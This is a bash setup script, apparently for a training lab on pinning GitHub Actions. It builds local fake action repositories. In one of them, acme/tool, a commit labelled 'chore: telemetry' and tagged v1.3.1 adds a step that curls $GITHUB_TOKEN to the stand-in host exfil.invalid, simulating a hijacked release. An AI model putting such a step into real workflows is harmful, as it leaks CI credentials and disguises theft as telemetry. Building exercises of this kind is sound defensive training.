#!/usr/bin/env bash
set -e
P=/home/analista/gha-pin
G=/srv/gh
mkdir -p "$P" "$G"
cp -r /opt/lab/setup/project/. "$P/"
chmod 0755 "$P/pin-scan.sh"
chown -R analista:analista "$P"
git config --system --add safe.directory '*'
export GIT_AUTHOR_NAME=bot GIT_AUTHOR_EMAIL=bot@example.invalid
export GIT_COMMITTER_NAME=bot GIT_COMMITTER_EMAIL=bot@example.invalid

# mkrepo <owner/repo>: repo de trabajo temporal → bare en $G/<owner/repo>.git
W=$(mktemp -d)
mkrepo(){ rm -rf "$W/r"; git init -q -b main "$W/r"; cd "$W/r"; }
commit(){ printf '%s\n' "$2" > "$1"; git add -A; git commit -qm "$3"; }
publish(){ mkdir -p "$(dirname "$G/$1")"; git clone -q --bare "$W/r" "$G/$1.git"; cd /; }

mkrepo
commit action.yml 'name: checkout # v4.1.7' 'v4.1.7'; git tag -a v4.1.7 -m v4.1.7
commit action.yml 'name: checkout # v4.2.2' 'v4.2.2'; git tag -a v4.2.2 -m v4.2.2; git tag v4
commit action.yml 'name: checkout # wip' 'wip: refactor'
publish actions/checkout

mkrepo
commit action.yml 'name: setup-python # v5.3.0' 'v5.3.0'; git tag -a v5.3.0 -m v5.3.0; git tag v5
publish actions/setup-python

mkrepo
commit action.yml 'name: lint # v2.0.1' 'v2.0.1'; git tag -a v2.0.1 -m v2.0.1; git tag v2
publish acme/lint

mkrepo
mkdir -p .github/workflows
commit .github/workflows/release.yml 'on: workflow_call' 'release workflow'
publish acme/workflows

mkrepo
commit action.yml 'name: tool # v1.2.0' 'v1.2.0'; git tag -a v1.2.0 -m v1.2.0
commit action.yml 'name: tool # v1.3.0' 'v1.3.0'; git tag -a v1.3.0 -m v1.3.0
commit action.yml 'name: tool
runs: {using: composite, steps: [{shell: bash, run: "curl -s https://exfil.invalid/?t=$GITHUB_TOKEN"}]}' \
  'chore: telemetry'
git tag -a v1.3.1 -m v1.3.1; git tag v1
publish acme/tool

rm -rf "$W"
chmod -R a+rX "$G"
echo "Lab 96 plantado."
